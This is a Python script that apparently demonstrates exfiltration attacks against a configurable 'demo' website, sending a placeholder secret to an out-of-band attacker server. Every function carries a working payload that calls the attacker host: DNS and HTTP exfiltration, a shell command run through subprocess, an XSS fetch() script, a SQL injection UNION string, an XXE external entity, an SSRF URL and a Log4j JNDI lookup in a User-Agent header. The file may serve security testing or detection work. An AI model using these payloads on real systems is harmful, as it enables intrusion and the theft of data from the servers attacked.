import requests
import subprocess
import dns.resolver
import traceback

# Configuration
DEMO_WEBSITE_URL = "http://oobserver.net"  # Update to your demo website URL
ATTACKER_SERVER_URL = "http://oastify.com"  # Update to your attack server URL

def check_server():
    """Check if the attack server is reachable."""
    try:
        response = requests.get(f"{ATTACKER_SERVER_URL}/test?data=test")
        print(f"Attack server response status code: {response.status_code}")
        print(f"Attack server response content: {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"Failed to connect to the attack server: {e}")
        print(traceback.format_exc())
        exit(1)

def dns_exfiltration(data):
    """Perform DNS exfiltration."""
    domain = f"{data}.oastify.com"  # Example domain, adjust as needed
    try:
        result = dns.resolver.resolve(domain, 'A')
        print(f"DNS resolution result: {result.rrset}")
    except Exception as e:
        print(f"DNS exfiltration error: {e}")
        print(traceback.format_exc())

def http_exfiltration(data):
    """Perform HTTP exfiltration."""
    url = f"{ATTACKER_SERVER_URL}/http?data={data}"
    try:
        response = requests.get(url)
        print(f"HTTP exfiltration response status code: {response.status_code}")
        print(f"HTTP exfiltration response content: {response.text}")
    except Exception as e:
        print(f"HTTP exfiltration error: {e}")
        print(traceback.format_exc())

def command_injection(data):
    """Perform command injection."""
    try:
        cmd = f"python -c \"import requests; print(requests.get('{ATTACKER_SERVER_URL}/cmd?data={data}').text)\""
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        print(f"Command output: {result.stdout}")
        print(f"Command error: {result.stderr}")
    except Exception as e:
        print(f"Command injection error: {e}")
        print(traceback.format_exc())

def xss_exfiltration(data):
    """Perform XSS exfiltration."""
    payload = f"<script>fetch('{ATTACKER_SERVER_URL}/xss?data={data}')</script>"
    try:
        response = requests.get(f"{DEMO_WEBSITE_URL}/random_endpoint", params={"input": payload})
        print(f"XSS exfiltration response status code: {response.status_code}")
        print(f"XSS exfiltration response content: {response.text}")
    except Exception as e:
        print(f"XSS exfiltration error: {e}")
        print(traceback.format_exc())

def sql_injection(data):
    """Perform SQL injection."""
    payload = f"1' UNION SELECT '{data}'--"
    try:
        response = requests.get(f"{DEMO_WEBSITE_URL}/search", params={"query": payload})
        print(f"SQL injection response status code: {response.status_code}")
        print(f"SQL injection response content: {response.text}")
    except Exception as e:
        print(f"SQL injection error: {e}")
        print(traceback.format_exc())

def xxe_exfiltration(data):
    """Perform XXE exfiltration."""
    payload = f"""<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "{ATTACKER_SERVER_URL}/xxe?data={data}">]>
    <foo>&xxe;</foo>"""
    headers = {'Content-Type': 'application/xml'}
    try:
        response = requests.post(f"{DEMO_WEBSITE_URL}/xxe", data=payload, headers=headers)
        print(f"XXE exfiltration response status code: {response.status_code}")
        print(f"XXE exfiltration response content: {response.text}")
    except Exception as e:
        print(f"XXE exfiltration error: {e}")
        print(traceback.format_exc())

def ssrf_exfiltration(data):
    """Perform SSRF exfiltration."""
    payload = f"{ATTACKER_SERVER_URL}/ssrf?data={data}"
    try:
        response = requests.get(f"{DEMO_WEBSITE_URL}/fetch", params={"url": payload})
        print(f"SSRF exfiltration response status code: {response.status_code}")
        print(f"SSRF exfiltration response content: {response.text}")
    except Exception as e:
        print(f"SSRF exfiltration error: {e}")
        print(traceback.format_exc())

def log4j_exfiltration(data):
    """Perform Log4j exfiltration."""
    payload = f"${{jndi:ldap://{ATTACKER_SERVER_URL}/log4j?data={data}}}"
    headers = {'User-Agent': payload}
    try:
        response = requests.get(DEMO_WEBSITE_URL, headers=headers)
        print(f"Log4j exfiltration response status code: {response.status_code}")
        print(f"Log4j exfiltration response content: {response.text}")
    except Exception as e:
        print(f"Log4j exfiltration error: {e}")
        print(traceback.format_exc())

def main():
    data_to_exfiltrate = "THIS_IS_THE_SENSITIVE_DATA_LEAVING_THE_SERVER"

    print("Checking if attack server is reachable...")
    check_server()

    print("\nPerforming DNS Exfiltration...")
    dns_exfiltration(data_to_exfiltrate)

    print("\nPerforming HTTP Exfiltration...")
    http_exfiltration(data_to_exfiltrate)

    print("\nPerforming Command Injection...")
    command_injection(data_to_exfiltrate)

    print("\nPerforming XSS Exfiltration...")
    xss_exfiltration(data_to_exfiltrate)

    print("\nPerforming SQL Injection...")
    sql_injection(data_to_exfiltrate)

    print("\nPerforming XXE Exfiltration...")
    xxe_exfiltration(data_to_exfiltrate)

    print("\nPerforming SSRF Exfiltration...")
    ssrf_exfiltration(data_to_exfiltrate)

    print("\nPerforming Log4j Exfiltration...")
    log4j_exfiltration(data_to_exfiltrate)

if __name__ == "__main__":
    main()